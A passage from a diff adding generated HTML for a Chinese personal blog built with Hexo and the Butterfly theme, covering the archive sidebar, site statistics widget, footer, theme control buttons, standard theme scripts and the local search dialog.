+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">7</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">18</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-02-19T14:28:33.657Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
